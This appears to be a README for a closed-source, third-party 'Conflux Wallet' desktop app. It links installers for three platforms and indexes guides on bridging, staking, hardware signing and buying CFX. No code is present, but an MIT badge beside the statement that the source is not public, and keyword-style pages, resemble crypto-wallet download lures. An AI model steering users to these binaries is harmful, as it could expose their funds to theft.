![Conflux Wallet](assets/banner-hub.png)

# Conflux Wallet staking, bridging and hardware

<p align="center">Staking, bridging, signing on a device, and what the rest of Conflux needs from a wallet.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

---

A desktop wallet is only part of what a Conflux account is used for. This repository covers the work around it: moving CFX between Core Space and eSpace, staking and unstaking on Core Space, signing on a Ledger or a Trezor, connecting to a dApp that expects a browser wallet, and the market questions people ask when they hold CFX.

Every guide is written for the current release and stays inside what the product actually does. Where a task genuinely belongs to another wallet or to the network itself, the guide says so and links to the page that covers it, rather than stretching a wallet feature over a job it was never built for.

That boundary is the useful part. Staking, bridging and device signing each have a step that happens outside the wallet, and knowing which step that is shortens the fix: a bridge that looks stuck is usually a second transaction, a staking position that will not unlock is usually a 13-day period, and a device that will not sign is usually the wrong app open on it.

## Who it is for

- you hold CFX on Core Space and want to stake it without a second interface
- you need CFX on eSpace for a contract or a dApp and the bridge result is unclear
- you sign with a Ledger or a Trezor and the address or the app does not match
- you are comparing wallet options and want to know what a desktop wallet does that an extension does not

## Start here

<div align="center">

| Guide | What it covers |
|---|---|
| [What Is Conflux Wallet?](https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md) | Conflux Wallet is an independent, self-custody desktop application for holding and sending CFX on Conflux Core Space and eSpace. |
| [Conflux Wallet Download and Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md) | Download the installer for Windows, macOS or Linux from the project's GitHub releases page, then check the file name against the published version. |
| [Restore Conflux Wallet From Seed Phrase](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/restore-conflux-wallet-from-seed-phrase.md) | Choose restore rather than create, enter the words in order, in lowercase, with single spaces, and let the app derive the accounts. |
| [Core Space vs eSpace](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md) | Core Space uses cfx: addresses and native transfers; eSpace uses 0x addresses and EVM contracts, and the same phrase produces an account in each. |

</div>

---

## How to use these guides

1. Read [Bridge CFX Across Spaces](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/bridge-cfx-from-conflux-core-space-to-espace.md) before moving value; the mechanism is not an ordinary transfer.
2. If a bridge already looks stuck, go straight to [Bridge Transfer Stuck](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-bridge-stuck.md) and check for the second leg.
3. Read [Bridge Gas and Fees](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-bridge-gas-fees.md) before choosing a direction, because the return trip touches two ledgers.
4. Stake with [Stake CFX in Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md), then keep [Unstake CFX Locked for Voting](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md) for the exit, which is not immediate.
5. Set up a device with [Connect Ledger](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md) or [Connect Trezor](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-trezor-to-conflux-wallet.md) before the first signed transfer, not during it.
6. Finish with [Connect Conflux Wallet to a dApp](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-conflux-wallet-to-dapp.md) if a site expects a browser wallet.

---

## Guides in this repository

Every guide below lives in this repository, grouped by the job it does.

### Bridge

<div align="center">

| Guide | What it covers |
|---|---|
| [Bridge CFX Across Spaces](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/bridge-cfx-from-conflux-core-space-to-espace.md) | CFX crosses between Core Space and eSpace through the network's own mechanism, not an ordinary transfer, and each direction has its own steps. |
| [Bridge Transfer Stuck](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-bridge-stuck.md) | A bridge transfer is rarely stuck on the network side; the missing leg is usually a second transaction the interface did not send. |
| [Bridge Gas and Fees](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-bridge-gas-fees.md) | Bridging costs gas on each ledger it touches: one fee going into eSpace and two coming back, charged whether or not the transfer completes. |

</div>

### Staking

<div align="center">

| Guide | What it covers |
|---|---|
| [Stake CFX in Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md) | Staking happens on Core Space only, locks at least 1,000 CFX per vote, and the wallet shows staked, unlocking and reward balances beside spendable CFX. |
| [Unstake CFX Locked for Voting](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md) | A voting position returns in stages, and the 13-day entry period comes before the unlock, so the balance is not available on the day you unstake. |
| [CFX Staking Rewards](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-cfx-staking-rewards.md) | Staked CFX earns interest for as long as it secures finality, and the rate varies by mechanism and period rather than staying fixed. |

</div>

### Hardware

<div align="center">

| Guide | What it covers |
|---|---|
| [Connect Ledger to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md) | Unlock the device, open the Conflux app, connect it to the wallet and approve each transaction on the device screen before anything is signed. |
| [Connect Trezor to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-trezor-to-conflux-wallet.md) | Trezor signs for eSpace through the Ethereum app on the standard path, so the address must match the one the wallet expects. |
| [Hardware Wallet for CFX](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/which-hardware-wallet-supports-conflux-cfx.md) | Ledger and Trezor are the two supported families, and the model, firmware and app selected on the device all have to agree. |

</div>

### Comparison

<div align="center">

| Guide | What it covers |
|---|---|
| [Conflux Wallet vs Fluent](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-vs-fluent.md) | Fluent is a browser extension for eSpace contracts; Conflux Wallet is a desktop application that holds Core Space and eSpace accounts with self-custody keys. |

</div>

### dApps

<div align="center">

| Guide | What it covers |
|---|---|
| [Connect Conflux Wallet to a dApp](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-conflux-wallet-to-dapp.md) | A Connect wallet button looks for a browser extension, so a desktop wallet pairs through the flow the site documents rather than injecting an account. |

</div>

### Market

<div align="center">

| Guide | What it covers |
|---|---|
| [CFX Price Today](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-cfx-price-today.md) | This page does not print a price: CFX is priced by the market, and a number written into a guide is wrong by the time a reader arrives. |
| [How to Buy CFX](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/how-to-buy-cfx-for-conflux-wallet.md) | Buy CFX on an exchange, complete its identity checks, then withdraw to your own address in the space you plan to use. |

</div>

### Brand

<div align="center">

| Guide | What it covers |
|---|---|
| [What Is Cflux?](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/cflux-wallet-misspelling-of-conflux.md) | Cflux is a misspelling of Conflux, not a separate network or wallet, and a download page using it is not the project's release. |

</div>

### App health

<div align="center">

| Guide | What it covers |
|---|---|
| [Conflux Wallet Network Error](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-network-error.md) | A network error means the app could not complete a request to the chain: the connection, the endpoint or the node is the place to look. |
| [Repair a Corrupt Wallet Database](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/repair-corrupt-conflux-wallet-database.md) | A corrupt local database affects display and history, not the keys, so a repair or a reinstall does not cost the accounts. |

</div>

## What each guide changes

<div align="center">

| If this is your situation | Start with | What is different afterwards |
|---|---|---|
| Move CFX to eSpace | [Bridge CFX Across Spaces](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/bridge-cfx-from-conflux-core-space-to-espace.md) | The transfer has the leg it needs on each ledger. |
| A bridge seems stuck | [Bridge Transfer Stuck](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-bridge-stuck.md) | The missing leg is identified instead of the whole transfer re-sent. |
| Stake for the first time | [Stake CFX in Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md) | A vote is locked with the 1,000 CFX minimum met. |
| Unstake a voting position | [Unstake CFX Locked for Voting](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md) | The 13-day entry and the unlock order are clear. |
| Sign on a hardware device | [Connect Ledger to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md) | The device signs and the address shown matches the account. |
| A dApp will not connect | [Connect Conflux Wallet to a dApp](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-conflux-wallet-to-dapp.md) | You know which wallet type the site expects and why. |

</div>

## Common first questions

### Can I stake on eSpace?

No. Staking is a Core Space operation, and the wallet's staking view only acts on Core Space accounts. eSpace holds CFX for contracts and transfers, not for votes.

### How much CFX does one vote need?

At least 1,000 CFX per vote. The amount stays locked while the vote is active and returns in stages after unstaking, with a 13-day entry period first.

### Why does bridging cost more in one direction?

Each ledger the transfer touches charges its own gas, and the return direction touches two. The fee is network work, not a charge from the wallet.

### Does a Ledger sign for both spaces?

Yes, when the Conflux app is open on the device and the address it shows matches the account in the wallet. A mismatch is usually the wrong app or the wrong derivation path.

## More guides

- [setup-handbook](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md) - Install, verify, update and understand Conflux Wallet: the first-run guides and the two-space basics.
- [recovery-playbook](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/README.md) - Restore access and fix balances, pending transfers and address mismatches in Conflux Wallet.

---

## Before you install

Download only from the release page linked above, and check that the file name and
version match. Conflux Wallet support never asks for a recovery phrase, a private key
or a password, and it never messages first. A wallet is not an exchange and cannot
reverse a confirmed transaction.

This repository does not cover installation, recovery or download verification; the setup handbook and the recovery playbook do. It also does not quote staking returns as a fixed number, because the rate varies by mechanism and period; the wallet shows the position instead.

## About

Conflux Wallet is an independent third-party desktop wallet for Conflux Network, not a
foundation release. Documentation here describes the current release and the network
it runs on; it does not describe the product's source code, which is not public.

## License

MIT

